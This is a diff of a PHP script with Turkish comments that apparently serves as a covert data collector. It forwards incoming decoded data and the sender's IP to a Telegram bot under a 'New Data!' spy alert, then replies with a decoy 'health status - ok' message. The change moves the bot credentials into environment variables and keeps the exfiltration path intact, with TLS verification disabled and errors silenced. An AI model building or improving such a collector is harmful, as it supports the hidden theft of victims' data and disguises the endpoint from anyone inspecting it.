@@ -16,17 +16,24 @@ $timestamp = date('Y-m-d H:i:s');
 $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
 
 // 3. Telegram'a Bildir (cURL ile)
-$telegramBotToken = 'BOT_TOKEN';  // Buraya Telegram bot token'ınızı yazın
-$telegramChatID = 'CHAT_ID';  // Buraya Telegram chat ID'nizi yazın
-$message = urlencode("🕵️ Yeni Veri!\n⌚ Zaman: $timestamp\n🌐 IP: $ip\n📦 Veri: $decodedData");
-$telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=$message";
+$telegramBotToken = getenv('BOT_TOKEN');  // Çevre değişkeninden token'ı al
+$telegramChatID = getenv('CHAT_ID');      // Çevre değişkeninden chat ID'yi al
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $telegramURL);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-@curl_exec($ch);
-curl_close($ch);
+if ($telegramBotToken && $telegramChatID) {
+    $message = urlencode("🕵️ Yeni Veri!\n⌚ Zaman: $timestamp\n🌐 IP: $ip\n📦 Veri: $decodedData");
+    $telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=$message";
+
+    // Telegram API'ye cURL isteği gönder
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $telegramURL);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    @curl_exec($ch);
+    curl_close($ch);
+} else {
+    // Eğer token veya chat ID mevcut değilse, hata mesajı ver
+    error_log("Telegram bot token veya chat ID ayarlanmamış.");
+}
 
 // 4. Yanıtı Gönder
 echo "health status - ok";
